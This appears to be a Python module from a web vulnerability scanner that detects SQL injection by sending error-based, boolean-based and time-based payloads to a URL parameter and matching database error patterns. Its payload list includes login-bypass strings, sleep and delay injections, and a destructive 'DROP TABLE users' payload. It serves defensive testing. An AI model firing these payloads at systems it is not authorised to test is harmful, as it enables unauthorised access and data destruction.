"""
SQL Injection Detection Module

Detects SQL injection vulnerabilities using multiple techniques:
- Error-based detection
- Boolean-based blind detection
- Time-based blind detection
"""

import re
import time
from typing import List, Dict, Optional
import asyncio
import logging

from app.scanner.modules.base import BaseModule, VulnerabilityResult, Severity, Confidence
from app.scanner.core.requester import AsyncRequester, RequestMethod

logger = logging.getLogger(__name__)


# SQL Injection Payloads
SQLI_PAYLOADS = {
    'error_based': [
        "'",
        "''",
        "\"",
        "\"\"",
        "`",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1",
        "1 OR 1=1",
        "1' OR 1=1 --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1'; DROP TABLE users--",
        "admin'--",
        "admin' #",
        "') OR ('1'='1",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
    'boolean_based': [
        "' AND '1'='1",
        "' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND '1'='1' AND '1'='1",
        "1' AND '1'='2' AND '1'='1",
    ],
    'time_based': [
        "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
        "'; SELECT SLEEP(5)--",         # MySQL
        "' OR SLEEP(5)--",              # MySQL
        "1; SELECT pg_sleep(5)--",      # PostgreSQL
        "' || pg_sleep(5)--",           # PostgreSQL
        "1' AND SLEEP(5)--",            # MySQL
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL
    ]
}

# SQL Error Patterns
SQL_ERROR_PATTERNS = [
    # MySQL
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySqlException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
    r"MySqlClient\.",
    r"com\.mysql\.jdbc",
    r"Unclosed quotation mark after the character string",

    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError:",
    r"org\.postgresql\.util\.PSQLException",
    r"ERROR:\s+syntax error at or near",

    # Microsoft SQL Server
    r"Driver.*SQL Server",
    r"OLE DB.*SQL Server",
    r"\bSQL Server[^&lt;&quot;]+Driver",
    r"Warning.*mssql_",
    r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
    r"System\.Data\.SqlClient\.",
    r"Exception.*\WSystem\.Data\.SqlClient\.",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"com\.microsoft\.sqlserver\.jdbc",
    r"Unclosed quotation mark",

    # Oracle
    r"\bORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_",
    r"Warning.*\Wora_",
    r"oracle\.jdbc\.driver",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",

    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_",
    r"Warning.*SQLite3::",
    r"\[SQLITE_ERROR\]",
    r"SQLite error \d+:",
    r"sqlite3.OperationalError:",
    r"SQLite3::SQLException",
    r"org\.sqlite\.JDBC",
    r"SQLiteException",

    # Generic SQL errors
    r"SQL syntax",
    r"SQL error",
    r"syntax error",
    r"unexpected end of SQL",
    r"Query failed",
    r"Database error",
    r"SQLSTATE",
    r"SQLException",
    r"Syntax error in query",
    r"You have an error in your SQL syntax",
]


class SQLInjectionModule(BaseModule):
    """
    SQL Injection Detection Module

    Detects:
    - Error-based SQL injection
    - Boolean-based blind SQL injection
    - Time-based blind SQL injection
    """

    name = "SQL Injection Scanner"
    description = "Detects SQL Injection vulnerabilities"
    vulnerability_type = "sqli"
    cwe_id = "CWE-89"
    owasp_category = "A03:2021"

    # CVSS for SQL Injection (Critical)
    CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    CVSS_SCORE = 9.8

    def __init__(self):
        super().__init__()
        self._compiled_patterns = [
            re.compile(pattern, re.IGNORECASE | re.DOTALL)
            for pattern in SQL_ERROR_PATTERNS
        ]

    async def check(self, *args, **kwargs) -> List[VulnerabilityResult]:
        """Passive SQL injection check."""
        return []  # SQLi requires active testing

    async def test(
            self,
            requester: AsyncRequester,
            url: str,
            parameter: str,
            original_value: str,
            method: str = 'GET'
    ) -> List[VulnerabilityResult]:
        """
        Active SQL injection testing.

        Tests for:
        1. Error-based injection (SQL errors in response)
        2. Boolean-based blind injection (different responses for true/false)
        3. Time-based blind injection (response time differences)
        """
        results = []
        request_method = RequestMethod.POST if method.upper() == 'POST' else RequestMethod.GET

        # Get baseline response
        baseline = await requester.get(url, use_cache=True)
        if baseline.error:
            return results

        baseline_length = len(baseline.body)
        baseline_time = baseline.elapsed

        # Test 1: Error-based injection
        error_result = await self._test_error_based(
            requester, url, parameter, original_value, request_method, baseline
        )
        if error_result:
            results.append(error_result.to_dict())
            return results  # Critical finding, no need to continue

        # Test 2: Boolean-based blind injection
        bool_result = await self._test_boolean_based(
            requester, url, parameter, original_value, request_method, baseline
        )
        if bool_result:
            results.append(bool_result.to_dict())

        # Test 3: Time-based blind injection (only if no other findings)
        if not results:
            time_result = await self._test_time_based(
                requester, url, parameter, original_value, request_method
            )
            if time_result:
                results.append(time_result.to_dict())

        return results

    async def _test_error_based(
            self,
            requester: AsyncRequester,
            url: str,
            parameter: str,
            original_value: str,
            method: RequestMethod,
            baseline
    ) -> Optional[VulnerabilityResult]:
        """Test for error-based SQL injection."""

        for payload in SQLI_PAYLOADS['error_based'][:8]:
            try:
                response, injected = await requester.test_payload(
                    url=url,
                    parameter=parameter,
                    payload=payload,
                    method=method,
                    original_value=original_value
                )

                if response.error:
                    continue

                # Check for SQL error patterns
                error_found = self._check_sql_errors(response.body)

                if error_found:
                    return self.create_vulnerability(
                        name="SQL Injection (Error-Based)",
                        severity=Severity.CRITICAL,
                        url=url,
                        description=f"The parameter '{parameter}' is vulnerable to SQL injection. "
                                    f"SQL error messages were returned when injecting malicious SQL syntax.",
                        confidence=Confidence.CONFIRMED,
                        parameter=parameter,
                        method=method.value,
                        payload=payload,
                        evidence=f"SQL Error detected: {error_found}",
                        response_snippet=self.truncate(response.body, 500),
                        cvss_vector=self.CVSS_VECTOR,
                        cvss_score=self.CVSS_SCORE,
                        remediation=self._get_remediation(),
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                        ]
                    )

            except Exception as e:
                logger.error(f"Error testing SQLi payload: {e}")
                continue

        return None

    async def _test_boolean_based(
            self,
            requester: AsyncRequester,
            url: str,
            parameter: str,
            original_value: str,
            method: RequestMethod,
            baseline
    ) -> Optional[VulnerabilityResult]:
        """Test for boolean-based blind SQL injection."""

        # True condition
        true_payloads = ["' AND '1'='1", "1 AND 1=1", "' OR '1'='1"]
        # False condition
        false_payloads = ["' AND '1'='2", "1 AND 1=2", "' AND '0'='1"]

        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                # Test true condition
                true_response, _ = await requester.test_payload(
                    url=url,
                    parameter=parameter,
                    payload=true_payload,
                    method=method,
                    original_value=original_value
                )

                if true_response.error:
                    continue

                # Test false condition
                false_response, _ = await requester.test_payload(
                    url=url,
                    parameter=parameter,
                    payload=false_payload,
                    method=method,
                    original_value=original_value
                )

                if false_response.error:
                    continue

                # Compare responses
                true_len = len(true_response.body)
                false_len = len(false_response.body)
                baseline_len = len(baseline.body)

                # Significant difference between true and false conditions
                if abs(true_len - baseline_len) < 50 and abs(false_len - baseline_len) > 100:
                    return self.create_vulnerability(
                        name="SQL Injection (Boolean-Based Blind)",
                        severity=Severity.CRITICAL,
                        url=url,
                        description=f"The parameter '{parameter}' is vulnerable to boolean-based blind SQL injection. "
                                    f"The application responds differently to true and false SQL conditions.",
                        confidence=Confidence.HIGH,
                        parameter=parameter,
                        method=method.value,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=f"Response length difference: TRUE={true_len}, FALSE={false_len}, BASELINE={baseline_len}",
                        cvss_vector=self.CVSS_VECTOR,
                        cvss_score=self.CVSS_SCORE,
                        remediation=self._get_remediation(),
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                        ]
                    )

            except Exception as e:
                logger.error(f"Error testing boolean SQLi: {e}")
                continue

        return None

    async def _test_time_based(
            self,
            requester: AsyncRequester,
            url: str,
            parameter: str,
            original_value: str,
            method: RequestMethod
    ) -> Optional[VulnerabilityResult]:
        """Test for time-based blind SQL injection."""

        # Use shorter delay for efficiency
        delay_seconds = 3

        time_payloads = [
            f"'; WAITFOR DELAY '0:0:{delay_seconds}'--",
            f"' OR SLEEP({delay_seconds})--",
            f"1' AND SLEEP({delay_seconds})--",
            f"'; SELECT pg_sleep({delay_seconds})--",
        ]

        for payload in time_payloads:
            try:
                start_time = time.time()

                response, _ = await requester.test_payload(
                    url=url,
                    parameter=parameter,
                    payload=payload,
                    method=method,
                    original_value=original_value
                )

                elapsed = time.time() - start_time

                # If response took significantly longer than the delay
                if elapsed >= delay_seconds - 0.5:
                    # Verify with a second test
                    start_time = time.time()
                    verify_response, _ = await requester.test_payload(
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        method=method,
                        original_value=original_value
                    )
                    verify_elapsed = time.time() - start_time

                    if verify_elapsed >= delay_seconds - 0.5:
                        return self.create_vulnerability(
                            name="SQL Injection (Time-Based Blind)",
                            severity=Severity.CRITICAL,
                            url=url,
                            description=f"The parameter '{parameter}' is vulnerable to time-based blind SQL injection. "
                                        f"The application delayed {elapsed:.2f}s when a {delay_seconds}s delay was injected.",
                            confidence=Confidence.HIGH,
                            parameter=parameter,
                            method=method.value,
                            payload=payload,
                            evidence=f"Response delayed by {elapsed:.2f}s (expected {delay_seconds}s)",
                            cvss_vector=self.CVSS_VECTOR,
                            cvss_score=self.CVSS_SCORE,
                            remediation=self._get_remediation(),
                            references=[
                                "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                            ]
                        )

            except asyncio.TimeoutError:
                # Timeout could indicate successful injection
                pass
            except Exception as e:
                logger.error(f"Error testing time-based SQLi: {e}")
                continue

        return None

    def _check_sql_errors(self, body: str) -> Optional[str]:
        """Check for SQL error messages in response."""
        for pattern in self._compiled_patterns:
            match = pattern.search(body)
            if match:
                return match.group(0)[:100]
        return None

    def _get_remediation(self) -> str:
        """Get remediation guidance."""
        return """
1. **Use Parameterized Queries (Prepared Statements)**:
   ```python
   # Python example
   cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
   ```

2. **Use ORM (Object-Relational Mapping)**:
   - SQLAlchemy, Django ORM, etc. handle parameterization automatically

3. **Input Validation**:
   - Validate input type, length, format, and range
   - Reject unexpected or malicious input

4. **Least Privilege**:
   - Use database accounts with minimal necessary permissions
   - Never use admin/root database accounts for applications

5. **Web Application Firewall (WAF)**:
   - Deploy a WAF to detect and block SQL injection attempts

6. **Error Handling**:
   - Never display raw database errors to users
   - Log errors server-side, show generic messages to users
"""


# Module interface functions
async def check(*args, **kwargs) -> List[Dict]:
    """Passive check interface."""
    module = SQLInjectionModule()
    results = await module.check(*args, **kwargs)
    return [r.to_dict() if hasattr(r, 'to_dict') else r for r in results]


async def test(requester, url, parameter, value, method='GET') -> List[Dict]:
    """Active test interface."""
    module = SQLInjectionModule()
    return await module.test(requester, url, parameter, value, method)
